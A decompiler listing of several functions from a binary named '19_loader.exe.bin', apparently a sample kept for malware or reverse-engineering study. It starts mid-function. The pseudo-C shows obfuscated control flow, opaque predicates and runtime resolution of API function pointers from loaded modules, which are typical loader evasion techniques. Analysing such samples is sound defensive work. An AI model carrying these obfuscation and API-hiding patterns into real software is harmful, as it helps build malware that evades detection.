        puVar17 = (undefined4 *)&UNK_14008a9d8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x1098:
        FUN_140022c50(0x1400df360,&uStack_288);
      }
      FUN_1400115e2(&pHStack_2f0,_DAT_1400df360,_DAT_1400df370);
      pHVar3 = pHStack_2f0;
      uVar26 = _DAT_1400df470 * 0xe3826965966b831 + 0xde1d89309a73b2dc;
      uStack_288._0_4_ = 0x40088fca;
      uStack_288._4_4_ = 1;
      uStack_280._0_4_ = 0x17;
      uStack_280._4_4_ = 0;
      uStack_278 = SUB82(&uStack_2f8,0);
      uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
      uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
      puVar17 = (undefined4 *)&UNK_14008a8d0;
      if (_DAT_1400df9a0 != ((uint)uVar26 ^ 0x9f245feb)) {
        puVar17 = (undefined4 *)&UNK_14008a7ec;
      }
      uStack_2f8 = uVar26;
                    /* WARNING: Switch is manually overridden */
      switch(*puVar17) {
      case 0x2475:
        FUN_140022c50(0x1400df988,&uStack_288);
      }
      FUN_1400115e2(&uStack_288,_DAT_1400df988,_DAT_1400df998);
      pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
      pcVar14 = (code *)FUN_14000ff70(uVar21 + 0x97d8715f,pHVar3,-0x4c2f92f4,pHVar1);
      FUN_140001280(pHVar1,*(longlong *)
                            (auStack_244 +
                            ((ulonglong)
                             (byte)(((byte)(uVar21 + 0x97d8715f) ^ (byte)uVar26 ^ local_2cc + 0x1aU)
                                   - (char)(uVar21 ^ 0x2dd2d579)) - 0x44)),1,1);
      FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
      puVar12 = FUN_14000fc7a(0,(ulonglong)((uint)uVar26 + local_290 * 0x64272bf7 + -0xadd5d26));
      lVar25 = 0x208;
      if (puVar12 == (undefined8 *)0x0) {
        lVar25 = 400;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
      case 0xfffffb5b:
        *puVar12 = 0x756f6e7265646e75;
        puVar12[1] = 0x746e656d68736972;
        puVar12[2] = 0x656d697474726170;
        uStack_288._0_4_ = (uint)puVar12;
        uStack_288._4_4_ = (undefined4)((ulonglong)puVar12 >> 0x20);
        uVar20 = uVar21 + 0xd22d2a8f;
        *(undefined8 **)(auStack_244 + ((ulonglong)uVar20 - 0x44)) = puVar12 + 3;
        uStack_278 = 0;
        *(undefined2 *)(auStack_244 + ((ulonglong)(uVar20 ^ 0x10) - 0x44)) = 1;
        *(undefined2 *)(auStack_244 + ((ulonglong)(uVar20 ^ 0x12) - 0x44)) = 0;
        FUN_140008f9d((longlong *)&pHStack_2f0,&uStack_288);
        FUN_140001280(puVar12,(ulonglong)(uVar20 ^ 0x10),1,1);
        pHVar3 = pHStack_2f0;
        lVar25 = (*pcStack_2c8)(0,0,pHStack_2f0);
        lVar18 = 0x1c4;
        if (lVar25 == 0) {
          lVar18 = 0x1d8;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar18)) {
        case 0x2e7c:
          (*pcVar14)(lVar25);
        }
        uVar22 = uVar21 + 0xd22d2a8f;
        FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)uVar22),2,2);
        uStack_2f8 = 0x54328ee25ff86423;
        uStack_288._0_4_ = 0x4008a36e;
        uStack_288._4_4_ = 1;
        uStack_280._0_4_ = 0x18;
        uStack_280._4_4_ = 0;
        uVar19 = uVar22 ^ 0x18;
        *(ulonglong **)(auStack_244 + ((ulonglong)uVar19 - 0x44)) = &uStack_2f8;
        uVar20 = uVar21 + 0xd22d2a87;
        puVar17 = (undefined4 *)&UNK_14008a840;
        if (_DAT_1400dfa88 == uVar20) {
          puVar17 = (undefined4 *)&UNK_14008a914;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0xfffffd26:
          FUN_140022c50(0x1400dfa70,&uStack_288);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400dfa70,_DAT_1400dfa80);
        pHVar3 = pHStack_2f0;
        uStack_2f8 = 0xb5646bb3c63ca7ef;
        uStack_288._0_4_ = 0x40089113;
        uStack_288._4_4_ = 1;
        *(ulonglong *)(auStack_244 + ((ulonglong)(uVar21 ^ 0x2dd2d571) - 0x44)) =
             (ulonglong)((uVar21 ^ 0x2dd2d571) + 0x17);
        uStack_278 = SUB82(&uStack_2f8,0);
        uVar4 = uStack_278;
        uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
        uVar5 = uStack_276;
        uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
        uVar8 = uStack_274;
        puVar17 = (undefined4 *)&UNK_14008a904;
        if (_DAT_1400df560 ==
            (byte)(((char)uVar20 - (char)uVar22) + ((byte)DAT_1400df4a0 ^ 0x53U - local_2d0))) {
          puVar17 = (undefined4 *)&UNK_14008a8ec;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x10bf:
          FUN_140022c50(0x1400df548,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400df548,_DAT_1400df558);
        pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        pcStack_2c8 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x2c846385,pHVar1);
        FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
        FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
        uStack_2f8 = 0x15fe3474356628b2;
        uStack_288._0_4_ = 0x40088afc;
        uStack_288._4_4_ = 1;
        uStack_280 = (((ulonglong)(uVar19 ^ uVar20) ^
                      *(ulonglong *)
                       (*(longlong *)
                         ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x10))
                     - (ulonglong)uVar20) - (ulonglong)uVar19;
        puVar17 = (undefined4 *)&UNK_14008aa00;
        if (_DAT_1400df318 == ((uint)uStack_280 ^ 0x18)) {
          puVar17 = (undefined4 *)&UNK_14008a84c;
        }
        uStack_278 = uVar4;
        uStack_276 = uVar5;
        uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x50a:
          FUN_140022c50(0x1400df300,&uStack_288);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df300,_DAT_1400df310);
        pHVar3 = pHStack_2f0;
        uStack_2f8 = 0x7a498e3c1babed35;
        uStack_288._0_4_ = 0x4008a2bf;
        uStack_288._4_4_ = 1;
        uStack_280._0_4_ = 0x22;
        uStack_280._4_4_ = 0;
        puVar17 = (undefined4 *)&UNK_14008a848;
        if (_DAT_1400dfb78 == 0x2dd2d579 - uVar21) {
          puVar17 = (undefined4 *)&UNK_14008a894;
        }
        uStack_278 = uVar4;
        uStack_276 = uVar5;
        uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x22dc:
          FUN_140022c50(0x1400dfb60,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400dfb60,_DAT_1400dfb70);
        pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        uVar20 = uVar21 ^ 0xe87993a1;
        pcStack_2b8 = (code *)FUN_14000ff70(uVar20,pHVar3,0x39c58244,pHVar1);
        FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)(0xc5ab46e0 - uVar20) - 0x44)),
                      1,1);
        FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
        pHStack_2f0 = (HMODULE)0x8d1032d0ea064da0;
        uStack_288._0_4_ = 0x4008a02a;
        uStack_288._4_4_ = 1;
        uStack_280._0_4_ = 0x12;
        uStack_280._4_4_ = 0;
        uStack_278 = SUB82(&pHStack_2f0,0);
        uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
        uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
                    /* WARNING: Switch is manually overridden */
        switch(_DAT_1400dfb38 == (uVar21 ^ 0x2dd2d579)) {
        case false:
          FUN_140022c50(0x1400dfb20,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400dfb20,_DAT_1400dfb30);
        pvVar2 = (LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        lVar25 = (*pcStack_2c8)(pvVar2);
        FUN_140001280(pvVar2,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
        FUN_1400225e0((undefined1 (*) [32])&uStack_288,0,0x208);
        lVar18 = 8;
        if (lVar25 == 0) {
          lVar18 = 0x1f0;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar18)) {
        case 0xf21:
          (*pcStack_2b8)(lVar25,&uStack_288,0x104);
          break;
        case 0x10ba:
        }
        uVar26 = uStack_2b0;
        pHStack_2f0 = (HMODULE)(uStack_2b0 ^ 0xad260532b81bf949);
        uStack_288._0_4_ = 0x4008a0e7;
        uStack_288._4_4_ = 1;
        uVar21 = (uint)pHStack_2f0 ^ 0x95c92c38;
        *(ulonglong *)(auStack_244 + ((ulonglong)uVar21 - 0x44)) =
             (ulonglong)
             (((*(int *)(*(longlong *)
                          ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x40)
               - (uVar20 - (0xc5ab46e0 - uVar20))) + 0x6fff22e5) * -0x394b957f);
        *(HMODULE **)
         (auStack_244 +
         ((ulonglong)(((_DAT_1400dfbf0 ^ uVar21) - (uVar20 + (uint)pHStack_2f0)) - 0x60a & 0xffff) -
         0x44)) = &pHStack_2f0;
        puVar17 = (undefined4 *)&UNK_14008a9fc;
        if (_DAT_1400df648 == 0) {
          puVar17 = (undefined4 *)&UNK_14008a8b8;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x8e9:
          FUN_140022c50(0x1400df630,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400df630,_DAT_1400df640);
        uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        uStack_2f8 = 0x1ad99a3499547d76;
        pHStack_2f0 = (HMODULE)0x14008a25d;
        uVar21 = (uint)uVar26;
        uStack_2e8 = (ulonglong)(-uVar21 + 0x2dd2d599);
        *(ulonglong **)((longlong)&pHStack_2f0 + (ulonglong)(-uVar21 + 0x2dd2d589)) = &uStack_2f8;
        lVar25 = 0x6c;
        if (_DAT_1400df058 == 0) {
          lVar25 = 0x78;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
        case 0xfffffc0f:
          FUN_140022c50(0x1400df040,&pHStack_2f0);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df040,_DAT_1400df050);
        pHVar3 = pHStack_2f0;
        pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,uVar15,-0x4a29b098,pHStack_2f0);
        FUN_140001280(pHVar3,uStack_2e8,1,1);
        lVar25 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
        bVar6 = (byte)*(undefined8 *)(lVar25 + 0x60) ^ ~*(byte *)(lVar25 + 0x58) * '\x05';
        uVar23 = (ulonglong)bVar6;
        FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                      *(longlong *)(auStack_244 + (uVar23 - 0x44)),1,1);
        pHStack_2f0 = (HMODULE)(uVar23 + 0x4520e163c3067cc0);
        uStack_288._0_4_ = 0x40089ec7;
        uStack_288._4_4_ = 1;
        *(ulonglong *)(auStack_244 + (uVar23 - 0x44)) = (ulonglong)(bVar6 + 0x10);
        *(HMODULE **)(auStack_244 + ((ulonglong)(bVar6 + 8) - 0x44)) = &pHStack_2f0;
        lVar25 = 0x18c;
        if (_DAT_1400df0a0 == bVar6 - 8) {
          lVar25 = 0x1a8;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
        case 0xbd7:
          FUN_140022c50(0x1400df088,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400df088,_DAT_1400df098);
        uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        uStack_2f8 = 0xf8973dd0717d9f2b;
        pHStack_2f0 = (HMODULE)&UNK_140089f3e;
        *(undefined8 *)((longlong)&pHStack_2f0 + (ulonglong)(0x2dd2d581 - uVar21)) = 0x1d;
        *(ulonglong **)((longlong)&pHStack_2f0 + (ulonglong)(byte)~(local_2ca * '\x17')) =
             &uStack_2f8;
        lVar25 = 0x1b8;
        if (_DAT_1400df358 == (0x2dd2d581 - uVar21 ^ 8)) {
          lVar25 = 0x18;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
        case 0x444:
          FUN_140022c50(0x1400df340,&pHStack_2f0);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df340,_DAT_1400df350);
        pHVar3 = pHStack_2f0;
        uVar20 = 0xbc44f9a0 - uVar21;
        pcVar13 = (code *)FUN_14000ff70(-0x3a54b928,uVar15,uVar20,pHStack_2f0);
        uVar19 = uVar20 ^ 0x8e72242f;
        FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)uVar19),1,1);
        FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                      CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
        uVar15 = (*pcVar14)();
        uStack_278 = 0;
        uStack_276 = 0;
        uStack_274 = 0;
        uStack_270 = 0;
        uStack_26c = 0;
        uStack_288._0_4_ = 0;
        uStack_288._4_4_ = 0;
        uStack_280._0_4_ = 0;
        uStack_280._4_4_ = 0;
        (*pcVar13)(uVar15,&uStack_288,&uStack_280,
                   auStack_244 + ((ulonglong)(0x8e722437 - uVar20) - 0x44),
                   auStack_244 + ((ulonglong)(uVar20 ^ 0x8e72243f) - 0x44));
        pHStack_2f0 = (HMODULE)0xd5515ce51f8b4cfb;
        uStack_288._0_4_ = 0x40089144;
        uStack_288._4_4_ = 1;
        *(undefined8 *)(auStack_244 + ((ulonglong)uVar19 - 0x44)) = 0x18;
        uStack_278 = SUB82(&pHStack_2f0,0);
        uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
        uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
        puVar17 = (undefined4 *)&UNK_14008a8a4;
        if (_DAT_1400df428 == 0) {
          puVar17 = (undefined4 *)&UNK_14008a810;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x2837:
          FUN_140022c50(0x1400df410,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400df410,_DAT_1400df420);
        uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        uStack_2f8 = 0x89d090c05f5c4597;
        pHStack_2f0 = (HMODULE)&UNK_140089edf;
        uStack_2e8 = (ulonglong)uVar19 + _DAT_1400df3e0 + -0x305435f2ab65c92c;
        puVar17 = (undefined4 *)&UNK_14008a800;
        if (_DAT_1400df520 == (int)uStack_2e8 + -0x18) {
          puVar17 = (undefined4 *)&UNK_14008a988;
        }
        puStack_2e0 = &uStack_2f8;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x2b7c:
          FUN_140022c50(0x1400df508,&pHStack_2f0);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df508,_DAT_1400df518);
        pHVar3 = pHStack_2f0;
        pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,uVar15,-0x517e8ca2,pHStack_2f0);
        FUN_140001280(pHVar3,uStack_2e8,1,1);
        FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                      CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
        pHStack_2f0 = (HMODULE)0x3c937a4c17434d3e;
        uStack_288._0_4_ = 0x40089dad;
        uStack_288._4_4_ = 1;
        uStack_280._0_4_ = uVar21 + 0xd22d2a99;
        uStack_280._4_4_ = 0;
        uStack_278 = SUB82(&pHStack_2f0,0);
        uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
        uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
        puVar17 = (undefined4 *)&UNK_14008a9cc;
        if (_DAT_1400df9c0 == 0) {
          puVar17 = (undefined4 *)&UNK_14008aa1c;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x523:
          FUN_140022c50(0x1400df9a8,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,_DAT_1400df9a8,_DAT_1400df9b8);
        uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        uStack_2f8 = uVar26 ^ 0x798a008df5e25e02;
        pHStack_2f0 = (HMODULE)0x14008a202;
        uStack_2e8 = 0x15;
        *(ulonglong **)((longlong)&pHStack_2f0 + (ulonglong)((int)uStack_2f8 + 0x27cf7495)) =
             &uStack_2f8;
        puVar17 = (undefined4 *)&UNK_14008a980;
        if (_DAT_1400df2e8 == 0) {
          puVar17 = (undefined4 *)&UNK_14008a86c;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0x2caf:
          FUN_140022c50(0x1400df2d0,&pHStack_2f0);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df2d0,_DAT_1400df2e0);
        pHVar3 = pHStack_2f0;
        uVar20 = uVar21 ^ 0xaa86db6d;
        pcVar13 = (code *)FUN_14000ff70(-0x63b57f7e,uVar15,uVar20,pHStack_2f0);
        FUN_140001280(pHVar3,uStack_2e8,1,1);
        FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                      *(longlong *)(auStack_244 + ((ulonglong)(0x87540e1c - uVar20) - 0x44)),1,1);
        uVar8 = (*pcVar14)();
        pHStack_2f0 = (HMODULE)CONCAT44(pHStack_2f0._4_4_,uVar8);
        (*pcVar13)(&pHStack_2f0);
        uStack_2f8 = (ulonglong)uVar20 + 0xd21761ae72613edb;
        uStack_288._0_4_ = 0x4008a3f2;
        uStack_288._4_4_ = 1;
        uStack_280._0_4_ = 0x18;
        uStack_280._4_4_ = 0;
        uStack_278 = SUB82(&uStack_2f8,0);
        uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
        uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
        lVar25 = 0x22c;
        if (_DAT_1400df608 == uVar20 + 0x78abf1ec) {
          lVar25 = 0xa4;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
        case 0x236f:
          FUN_140022c50(0x1400df5f0,&uStack_288);
        }
        FUN_1400115e2(&pHStack_2f0,_DAT_1400df5f0,_DAT_1400df600);
        pHVar3 = pHStack_2f0;
        uStack_2f8 = uVar26 ^ 0xae1054779d129b8e;
        uStack_288._0_4_ = 0x4008a19c;
        uStack_288._4_4_ = 1;
        uVar20 = (uint)uStack_2f8;
        uStack_280._0_4_ = uVar20 + 0x4f3fb123;
        uStack_280._4_4_ = 0;
        *(ulonglong **)(auStack_244 + ((ulonglong)(uVar20 ^ 0xb0c04ee7) - 0x44)) = &uStack_2f8;
        puVar17 = (undefined4 *)&UNK_14008a880;
        if (_DAT_1400deff8 == -0x4f3fb109 - uVar20) {
          puVar17 = (undefined4 *)&UNK_14008a910;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar17) {
        case 0:
          FUN_140022c50(0x1400defe0,&uStack_288);
        }
        FUN_1400115e2(&uStack_288,DAT_1400defe0,DAT_1400deff0);
        pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
        pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x44d87162,pHVar1);
        FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)(uVar21 + 0xd22d2a8f) - 0x44)),
                      1,1);
        FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
        uVar26 = (ulonglong)(uVar21 + 0xd22d2a8f ^ 0x1c);
        *(undefined8 *)(auStack_244 + (uVar26 - 0x44)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x3c)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x34)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x2c)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x24)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x1c)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0x14)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 0xc)) = 0;
        *(undefined8 *)(auStack_244 + (uVar26 - 4)) = 0;
        *(undefined8 *)(auStack_244 + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_23c + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_234 + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_22c + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_224 + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_21c + uVar26 + 4) = 0;
        *(undefined8 *)(auStack_214 + uVar26 + 4) = 0;
        uStack_288._0_4_ = 0x94;
        uStack_288._4_4_ = 0;
        uStack_280._0_4_ = 0;
        uStack_280._4_4_ = 0;
        uStack_278 = 0;
        uStack_276 = 0;
        (*pcVar14)(&uStack_288);
        return;
      }
    }
  }
                    /* WARNING: Does not return */
  pcVar14 = (code *)invalidInstructionException();
  (*pcVar14)();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x8d54 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140008d54 rva=0x8d54 */

ulonglong FUN_140008d54(uint param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong lVar3;
  uint uVar4;
  uint uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  
  uVar6 = 0xb;
  lVar1 = 0;
  do {
    uVar2 = uVar6 >> 1;
    uVar6 = uVar6 - uVar2;
    lVar3 = uVar2 + lVar1;
    if (param_1 < ((&DAT_1400888c0)[lVar3] & 0x1fffff)) {
      lVar3 = lVar1;
    }
    lVar1 = lVar3;
  } while (1 < uVar6);
  uVar2 = (ulonglong)((&DAT_1400888c0)[lVar3] * 0x800 == param_1 * 0x800) + lVar3 +
          (ulonglong)((uint)((&DAT_1400888c0)[lVar3] * 0x800) < param_1 * 0x800);
  uVar6 = (ulonglong)((uint)(&DAT_1400888c0)[uVar2] >> 0x15);
  uVar7 = 0x2b;
  if ((uVar2 < 10) &&
     (uVar7 = (ulonglong)(*(uint *)(&DAT_1400888c4 + uVar2 * 4) >> 0x15), uVar2 == 0)) {
    uVar5 = 0;
  }
  else {
    uVar5 = *(uint *)(&DAT_1400888bc + uVar2 * 4) & 0x1fffff;
  }
  if (~uVar6 + uVar7 != 0) {
    uVar4 = 0;
    do {
      uVar4 = (byte)(&DAT_14008a596)[uVar6] + uVar4;
      if (param_1 - uVar5 < uVar4) break;
      uVar6 = uVar6 + 1;
    } while (uVar6 != uVar7 - 1);
  }
  return uVar6 & 0xffffffffffffff01;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x8e0f | no_partial_markers_not_a_CFG_proof ===== */
/* address=140008e0f rva=0x8e0f */

undefined8 FUN_140008e0f(HANDLE param_1,LPCSTR param_2,ulonglong param_3)

{
  code *pcVar1;
  uint uVar2;
  longlong lVar3;
  ulonglong uVar4;
  longlong lVar5;
  undefined8 uVar6;
  void *pvVar7;
  void *pvVar8;
  void *pvVar9;
  int aiStackX_8 [4];
  ushort auStackX_18 [8];
  undefined8 uStack_28;
  
  uStack_28 = 0x140008e1e;
  lVar3 = FUN_140013c00();
  lVar3 = -lVar3;
  if (((0x1000 < param_3) && (param_3 = 0x1000, param_2[0x1000] < -0x40)) &&
     (param_3 = 0xfff, param_2[0xfff] < -0x40)) {
    if (param_2[(ulonglong)(-0x41 < param_2[0xffe]) + 0xffd] < -0x40) goto LAB_140008f94;
    param_3 = (ulonglong)(-0x41 < param_2[0xffe]) + 0xffd;
  }
  *(longlong *)((longlong)aiStackX_8 + lVar3 + -8) = (longlong)auStackX_18 + lVar3;
  *(undefined4 *)((longlong)aiStackX_8 + lVar3) = 0x1000;
  *(undefined8 *)((longlong)auStackX_18 + lVar3 + -0x40) = 0x140008e9a;
  uVar2 = MultiByteToWideChar(0xfde9,8,param_2,(int)param_3,
                              *(LPWSTR *)((longlong)aiStackX_8 + lVar3 + -8),
                              *(int *)((longlong)aiStackX_8 + lVar3));
  if ((uVar2 == 0) || (pvVar8 = (void *)((longlong)auStackX_18 + lVar3), 0x1000 < uVar2))
  goto LAB_140008f94;
  pvVar9 = (void *)(longlong)(int)uVar2;
  *(undefined8 *)((longlong)auStackX_18 + lVar3 + -0x40) = 0x140008ec0;
  uVar4 = FUN_140002474(param_1,pvVar8,uVar2);
  if ((uVar4 & 1) == 0) {
    if (pvVar9 != pvVar8) {
      if (pvVar9 <= pvVar8) {
LAB_140008f94:
                    /* WARNING: Does not return */
        pcVar1 = (code *)invalidInstructionException();
        (*pcVar1)();
      }
      if ((*(ushort *)((longlong)auStackX_18 + (longlong)pvVar8 * 2 + lVar3) & 0xfc00) == 0xdc00) {
        pvVar7 = (void *)((longlong)auStackX_18 + (longlong)pvVar8 * 2 + lVar3);
        pvVar8 = (void *)((longlong)pvVar8 + 1);
        *(undefined8 *)((longlong)auStackX_18 + lVar3 + -0x40) = 0x140008f04;
        lVar5 = FUN_140002474(param_1,pvVar7,1);
        if (((lVar5 != 0) && (1 < ((uint)pvVar7 & 3) - 2)) && (((ulonglong)pvVar7 & 3) != 0)) {
          pcVar1 = *(code **)((longlong)pvVar7 + 7);
          *(undefined8 *)((longlong)auStackX_18 + lVar3 + -0x40) = 0x140008f22;
          (*pcVar1)();
        }
      }
      if (pvVar9 < pvVar8) goto LAB_140008f94;
      if (pvVar8 != (void *)0x0) {
        lVar3 = 0;
        do {
          lVar3 = lVar3 + 2;
        } while ((longlong)pvVar8 * 2 != lVar3);
      }
    }
    uVar6 = 0;
  }
  else {
    uVar6 = 1;
  }
  return uVar6;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x8f9d | no_partial_markers_not_a_CFG_proof ===== */
/* address=140008f9d rva=0x8f9d */

void FUN_140008f9d(longlong *param_1,undefined8 *param_2)

{
  byte *pbVar1;
  byte bVar2;
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  code *pcVar5;
  ushort *puVar6;
  byte *pbVar7;
  ushort *puVar8;
  uint uVar9;
  uint uVar10;
  ulonglong uVar11;
  ulonglong uVar12;
  ushort uVar13;
  ulonglong uVar14;
  longlong lVar15;
  byte *pbVar16;
  ulonglong uVar17;
  ushort uVar18;
  ushort *local_60;
  ushort *puStack_58;
  ushort *local_50;
  longlong *local_48;
  
  pbVar16 = (byte *)*param_2;
  if (pbVar16 == (byte *)0x0) {
LAB_140009033:
    if (*(short *)(param_2 + 3) != 1) {
      *param_1 = 2;
      param_1[1] = 0;
      param_1[2] = 0;
      return;
    }
    uVar13 = *(ushort *)((longlong)param_2 + 0x1a);
    uVar17 = 0;
    uVar12 = 0;
    pbVar16 = (byte *)0x0;
    goto LAB_14000904a;
  }
  uVar10 = (uint)*(ushort *)(param_2 + 2);
  if (*(ushort *)(param_2 + 2) != 0) {
    *(undefined2 *)(param_2 + 2) = 0;
    pbVar7 = (byte *)param_2[1];
    goto LAB_140008fce;
  }
  pbVar7 = (byte *)param_2[1];
  if (pbVar16 == pbVar7) goto LAB_140009033;
  bVar2 = *pbVar16;
  uVar10 = (uint)bVar2;
  if ((char)bVar2 < '\0') {
    uVar9 = bVar2 & 0x1f;
    pbVar1 = pbVar16 + 1;
    if (bVar2 < 0xe0) {
      pbVar16 = pbVar16 + 2;
      uVar10 = uVar9 << 6 | *pbVar1 & 0x3f;
      goto LAB_140008fce;
    }
    uVar10 = pbVar16[2] & 0x3f | (*pbVar1 & 0x3f) << 6;
    if (bVar2 < 0xf0) {
      pbVar16 = pbVar16 + 3;
      uVar9 = uVar9 << 0xc;
    }
    else {
      pbVar1 = pbVar16 + 3;
      pbVar16 = pbVar16 + 4;
      uVar9 = (bVar2 & 7) << 0x12;
      uVar10 = uVar10 << 6 | *pbVar1 & 0x3f;
    }
    uVar10 = uVar10 | uVar9;
    if (uVar10 < 0x10000) goto LAB_140008fce;
    uVar13 = (short)(uVar10 >> 10) + 0x3fc0U | 0xd800;
    *(ushort *)(param_2 + 2) = (ushort)uVar10 & 0x3ff | 0xdc00;
    lVar15 = 1;
  }
  else {
    pbVar16 = pbVar16 + 1;
LAB_140008fce:
    uVar13 = (ushort)uVar10;
    lVar15 = 0;
  }
  uVar17 = (ulonglong)*(ushort *)(param_2 + 3);
  auVar3._8_8_ = 0;
  auVar3._0_8_ = (longlong)pbVar7 - (longlong)pbVar16;
  uVar11 = (ulonglong)((longlong)pbVar7 - (longlong)pbVar16) / 3;
  uVar12 = (ulonglong)(0x5555555555555555 < SUB168(auVar3 * ZEXT816(0xaaaaaaaaaaaaaaab),0));
  if (uVar17 == 2) {
    uVar17 = 2;
    uVar12 = uVar11 + lVar15 + uVar12;
  }
  else {
    uVar12 = lVar15 + uVar17 + uVar11 + uVar12;
  }
LAB_14000904a:
  uVar11 = 3;
  if (3 < uVar12) {
    uVar11 = uVar12;
  }
  FUN_140002164(&local_60,uVar11 + 1,0,2,2);
  puVar8 = puStack_58;
  if ((char)local_60 != '\0') {
LAB_1400091a3:
                    /* WARNING: Does not return */
